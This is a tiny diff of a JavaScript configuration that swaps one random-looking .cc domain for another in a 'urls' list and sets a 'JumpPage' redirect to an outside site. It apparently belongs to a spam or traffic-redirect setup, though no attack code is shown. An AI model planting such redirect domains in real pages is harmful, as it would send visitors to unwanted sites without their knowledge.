@@ -37,7 +37,7 @@ var emails = [
 ];
 
 var urls=[
-	'owbeizap.cc',
+	'ukdgpgedw.cc',
 ];
                                                                                                                   
 var JumpPage="https://18hdm.net";
